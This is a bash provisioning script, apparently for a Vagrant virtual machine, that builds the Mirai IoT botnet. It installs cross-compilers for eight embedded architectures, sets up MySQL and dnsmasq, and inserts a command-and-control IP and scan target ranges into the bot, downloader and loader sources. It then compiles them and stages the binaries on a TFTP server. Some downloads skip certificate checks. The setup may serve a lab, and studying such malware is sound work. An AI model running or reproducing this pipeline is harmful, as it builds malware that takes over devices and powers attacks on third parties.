#!/usr/bin/env bash

echo ">>> Installing packages... $[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]"
export DEBIAN_FRONTEND=noninteractive
# if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 3 ]; then
echo "apt-get update"
      apt-get update
# fi
apt-get install -y git gcc electric-fence mysql-server mysql-client duende
mkdir -p /etc/maradns/logger/

if [ ! -d ~/go ]; then
  curl -O https://storage.googleapis.com/golang/go1.11.1.linux-amd64.tar.gz
  tar -C /usr/local -xzf go1.11.1.linux-amd64.tar.gz
  mkdir -p ~/go; echo "export GOPATH=$HOME/go" >> ~/.bashrc
  echo "export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin" >> ~/.bashrc
fi
source ~/.bashrc

# Mirai fork is included, no need to checkout
#
#if [ ! -d /vagrant/mirai ]; then
#  echo ">>> Cloning mirai repository..."
#  git clone https://github.com/James-Gallagher/Mirai.git /vagrant/mirai
#fi

COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"

if [ ! -d /vagrant/downloads ]; then
  echo ">>> downloading crosscompilers..."
  mkdir /vagrant/downloads/
  cd /vagrant/downloads/

  for compiler in $COMPILERS; do        
    wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
    if [ -f "${compiler}.tar.bz2" ]; then
      echo ">> $compiler downloaded"
    else
      echo "!> Can not download $compiler"
    fi
  done

fi

if [ ! -d /etc/xcompile ]; then
  echo ">>> Installing crosscompilers..."
  mkdir /etc/xcompile/
  cd /etc/xcompile/

  for compiler in $COMPILERS; do        
    cp /vagrant/downloads/${compiler}.tar.bz2 .
    if [ -f "${compiler}.tar.bz2" ]; then
      tar -jxf ${compiler}.tar.bz2
      rm ${compiler}.tar.bz2
      echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.mirairc
      echo ">> Compiler $compiler installed"
    else
      echo "!> Can not download $compiler"
    fi
  done

  echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.mirairc
  echo "export GOPATH=\$HOME/go" >> ~/.mirairc
  echo "source ~/.mirairc" >> ~/.bashrc

fi

echo ">>> Reloading mirairc..."
source ~/.mirairc

echo ">>> Getting go requirements..."
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo ">>> Configuring sql..."
mysql < /vagrant/configs/setup_sql.sql

echo ">>> Configuring dnsmasq..."
echo "service systemd-resolved stop"
      service systemd-resolved stop
mkdir -p /vagrant/tftp
if ps | grep dnsmasq ; then
  killall dnsmasq || true
fi
echo ">>> Preparing dnsmasq.conf, cnc server IP [$cnc_ip]"
cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
cp /vagrant/configs/dnsmasqhosts /etc/dnsmasqhosts
cp /vagrant/configs/resolv.dnsmasq /etc/resolv.dnsmasq
sed -i "s|{cnc_ip}|$cnc_ip|g;" /etc/dnsmasqhosts
dnsmasq

echo ">>> Building mirai bot and cnc..."
# process {DNS}
DNS=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
cp /vagrant/mirai/bot/resolv.cpp /vagrant/mirai/bot/resolv.c
cp /vagrant/mirai/bot/util.cpp /vagrant/mirai/bot/util.c
cp /vagrant/mirai/bot/scanner.cpp /vagrant/mirai/bot/scanner.c
sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/resolv.c
sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/util.c
sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/bot/scanner.c
sed -i "s|{tgt_bgn}|$tgt_bgn|g;" /vagrant/mirai/bot/scanner.c
sed -i "s|{tgt_end}|$tgt_end|g;" /vagrant/mirai/bot/scanner.c

# process {NI}
cp /vagrant/mirai/bot/const.hpp /vagrant/mirai/bot/const.h
sed -i "s|{NI}|$ni|g;" /vagrant/mirai/bot/const.h

# process {CNC}
CNC=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
cp /vagrant/mirai/dlr/main.cpp /vagrant/mirai/dlr/main.c
sed -i "s|{CNC}|$CNC|g;" /vagrant/mirai/dlr/main.c

# build debug
cd /vagrant/mirai/
./build.sh debug telnet
cp /vagrant/mirai/debug/mirai* /vagrant/tftp/

# build release
cd /vagrant/mirai/
./build.sh release telnet
cp /vagrant/mirai/release/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai/dlr
./build.sh
if ! [ -d /vagrant/mirai/loader/bins/ ]; then
  mkdir /vagrant/mirai/loader/bins
fi
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cp /vagrant/mirai/loader/src/main.cpp /vagrant/mirai/loader/src/main.c
sed -i "s|{CNC}|$cnc_ip|g;" /vagrant/mirai/loader/src/main.c
cd /vagrant/mirai/loader
./build.sh release
./build.sh debug
/vagrant/mirai/reports/build.sh 

echo ">>> Done"
